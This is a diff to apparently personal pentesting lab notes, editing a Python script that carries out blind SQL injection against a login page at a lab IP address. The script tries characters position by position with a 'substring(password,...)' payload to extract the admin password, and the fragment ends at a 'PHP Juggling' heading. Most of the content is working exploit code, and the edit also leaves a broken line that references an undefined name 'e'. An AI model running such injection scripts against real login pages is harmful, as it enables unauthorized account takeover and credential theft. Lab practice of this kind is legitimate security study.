@@ -53,7 +53,7 @@ signal.signal(signal.SIGINT, def_handler)
 # Variables globales
 
 login_url="http://10.129.229.139/login.php"
-characters=string.ascii_lowercase + string.digits
+characters=string.digits + e
 
 
 
@@ -68,11 +68,9 @@ def makeSQLI():
 	password = ""
 
 	for position in range(1,50):
-		pass
+		
 		for character in characters:
-			pass
-
-			post_data = { 'username': "admin' and substring(password,1,1)='%s'-- -" %character,
+			post_data = { 'username': "admin' and substring(password,%d,1)='%s'-- -" % (position, character),
 							'password': 'test'
 							}
 
@@ -81,7 +79,7 @@ def makeSQLI():
 			r = requests.post(login_url, data=post_data)
 
 			if "Try again.." not in r.text:
-				password = character
+				password += character
 				p2.status(password)
 				break
 
@@ -91,6 +89,10 @@ def makeSQLI():
 
 if __name__ == '__main__':
 	makeSQLI()
+
+
+
+
 ```
 
 ## PHP Juggling 
